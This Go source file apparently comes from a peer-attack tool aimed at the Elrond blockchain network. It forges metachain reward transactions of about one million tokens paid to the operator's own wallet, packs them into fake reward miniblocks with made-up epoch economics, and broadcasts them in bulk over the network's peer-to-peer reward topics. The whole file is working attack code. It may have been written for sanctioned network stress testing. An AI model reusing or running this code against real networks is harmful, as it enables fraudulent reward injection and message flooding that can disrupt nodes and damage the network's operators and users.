package p2p

import (
	"bytes"
	"encoding/hex"
	"fmt"
	"sort"

	"github.com/ElrondNetwork/elrond-go/core"
	"github.com/ElrondNetwork/elrond-go/data/block"
	"github.com/ElrondNetwork/elrond-go/data/rewardTx"
	"github.com/ElrondNetwork/elrond-go/p2p"
	"github.com/ElrondNetwork/elrond-go/process/factory"
	"github.com/SebastianJ/elrond-peer-attacker/utils"
	sdkTransactions "github.com/SebastianJ/elrond-sdk/transactions"
	sdkUtils "github.com/SebastianJ/elrond-sdk/utils"
	sdkWallet "github.com/SebastianJ/elrond-sdk/wallet"
)

type RewardTxWrapper struct {
	Tx        *rewardTx.RewardTx
	TxHash    []byte
	TxHexHash string
	ShardID   uint32
}

var (
	baseAmount float64 = 1000000.0
)

// BulkSendRewardTxs - bulk send reward txs
func BulkSendRewardTxs(messenger p2p.Messenger, wallet sdkWallet.Wallet) {
	amount := baseAmount + (100 * utils.RandomFloat64())

	metaBlock := &block.MetaBlock{
		EpochStart: getDefaultEpochStart(),
		Round:      uint64(49056),
		Epoch:      uint32(77),
	}

	rewards := []*RewardTxWrapper{}

	for i := 0; i < Configuration.Concurrency; i++ {
		rewardWrapper, err := GenerateRewardTx(wallet, amount, metaBlock)
		if err != nil {
			fmt.Printf("Error occurred generating a new reward transaction - error: %s\n", err.Error())
			continue
		} else {
			rewards = append(rewards, rewardWrapper)
		}
	}

	processMiniBlocks(messenger, rewards)
}

func processMiniBlocks(messenger p2p.Messenger, rewards []*RewardTxWrapper) {
	miniBlocks := make(block.MiniBlockSlice, Configuration.NumberOfShards)
	for i := uint32(0); i < Configuration.NumberOfShards; i++ {
		miniBlocks[i] = &block.MiniBlock{}
		miniBlocks[i].SenderShardID = core.MetachainShardId
		miniBlocks[i].ReceiverShardID = i
		miniBlocks[i].Type = block.RewardsBlock
		miniBlocks[i].TxHashes = make([][]byte, 0)
	}

	txs := make(map[string]*rewardTx.RewardTx)

	for _, rewardWrapper := range rewards {
		miniBlocks[rewardWrapper.ShardID].TxHashes = append(miniBlocks[rewardWrapper.ShardID].TxHashes, rewardWrapper.TxHash)
		txs[rewardWrapper.TxHexHash] = rewardWrapper.Tx
	}

	for shId := uint32(0); shId < Configuration.NumberOfShards; shId++ {
		sort.Slice(miniBlocks[shId].TxHashes, func(i, j int) bool {
			return bytes.Compare(miniBlocks[shId].TxHashes[i], miniBlocks[shId].TxHashes[j]) < 0
		})
	}

	finalMiniBlocks := make(block.MiniBlockSlice, 0)
	for i := uint32(0); i < Configuration.NumberOfShards; i++ {
		if len(miniBlocks[i].TxHashes) > 0 {
			finalMiniBlocks = append(finalMiniBlocks, miniBlocks[i])
		}
	}

	mrsTxs := MarshalizeRewardMiniBlocks(finalMiniBlocks, txs)

	bodies := make(map[uint32]block.MiniBlockSlice)
	for _, miniBlock := range finalMiniBlocks {
		bodies[miniBlock.ReceiverShardID] = append(bodies[miniBlock.ReceiverShardID], miniBlock)
	}

	mrsData := make(map[uint32][]byte, len(bodies))
	for shardId, subsetBlockBody := range bodies {
		buff, err := Configuration.P2P.InternalMarshalizer.Marshal(&block.Body{MiniBlocks: subsetBlockBody})
		if err != nil {
			continue
		}
		mrsData[shardId] = buff
	}

	broadcastRewardMiniBlocks(messenger, mrsTxs)
}

func broadcastRewardMiniBlocks(messenger p2p.Messenger, broadcastData map[string][][]byte) {
	for topic, data := range broadcastData {
		fmt.Printf("Starting to send reward data to topic %s, number of items: %d\n", topic, len(data))

		if !messenger.HasTopic(topic) {
			fmt.Printf("Joining reward topic: %s\n", topic)
			messenger.CreateTopic(topic, true)
		}

		for _, item := range data {
			messenger.Broadcast(topic, item)
		}
	}
}

// GenerateRewardTx - generates a reward tx
func GenerateRewardTx(wallet sdkWallet.Wallet, amount float64, metaBlock *block.MetaBlock) (*RewardTxWrapper, error) {
	rwdTx := &rewardTx.RewardTx{
		Round:   metaBlock.Round,
		Value:   sdkUtils.ConvertFloatAmountToBigInt(amount),
		RcvAddr: wallet.AddressBytes,
		Epoch:   metaBlock.Epoch,
	}

	shardID := sdkTransactions.CalculateShardForAddress(wallet.AddressBytes, Configuration.NumberOfShards)

	txHash, err := core.CalculateHash(Configuration.P2P.InternalMarshalizer, Configuration.P2P.Hasher, rwdTx)
	if err != nil {
		return &RewardTxWrapper{}, err
	}

	txHexHash := hex.EncodeToString(txHash)

	fmt.Printf("Generated reward transaction - amount: %f, receiver shard id: %d, hash: %s\n", amount, shardID, txHexHash)

	wrapper := &RewardTxWrapper{
		Tx:        rwdTx,
		TxHash:    txHash,
		TxHexHash: txHexHash,
		ShardID:   shardID,
	}

	return wrapper, nil
}

// MarshalizeRewardMiniBlocks creates the marshalized data to be sent to shards
func MarshalizeRewardMiniBlocks(miniBlocks block.MiniBlockSlice, txs map[string]*rewardTx.RewardTx) map[string][][]byte {
	mrsTxs := make(map[string][][]byte)

	for _, miniBlock := range miniBlocks {
		if miniBlock.Type != block.RewardsBlock {
			continue
		}

		broadcastTopic := createRewardBroadcastTopic(miniBlock.ReceiverShardID)
		if _, ok := mrsTxs[broadcastTopic]; !ok {
			mrsTxs[broadcastTopic] = make([][]byte, 0, len(miniBlock.TxHashes))
		}

		for _, txHash := range miniBlock.TxHashes {
			txHexHash := hex.EncodeToString(txHash)

			if _, ok := txs[txHexHash]; ok {
				rwdTx := txs[txHexHash]

				marshalizedData, err := Configuration.P2P.InternalMarshalizer.Marshal(rwdTx)
				if err != nil {
					fmt.Printf("MarshalizeRewardMiniBlocks - tx hash: %s, error: %s\n", txHexHash, err.Error())
					continue
				}

				mrsTxs[broadcastTopic] = append(mrsTxs[broadcastTopic], marshalizedData)
			}
		}

		if len(mrsTxs[broadcastTopic]) == 0 {
			delete(mrsTxs, broadcastTopic)
		}
	}

	return mrsTxs
}

func getDefaultEpochStart() block.EpochStart {
	return block.EpochStart{
		Economics: block.Economics{
			TotalSupply:         sdkUtils.ConvertFloatAmountToBigInt(1000000.0),
			TotalToDistribute:   sdkUtils.ConvertFloatAmountToBigInt(1000000.0),
			TotalNewlyMinted:    sdkUtils.ConvertFloatAmountToBigInt(1000000.0),
			RewardsPerBlock:     sdkUtils.ConvertFloatAmountToBigInt(1000000.0),
			NodePrice:           sdkUtils.ConvertFloatAmountToBigInt(1000000.0),
			RewardsForCommunity: sdkUtils.ConvertFloatAmountToBigInt(1000000.0),
		},
	}
}

func createRewardBroadcastTopic(receiverShardID uint32) string {
	return fmt.Sprintf("%s_%d_META", factory.RewardsTransactionTopic, receiverShardID)
}
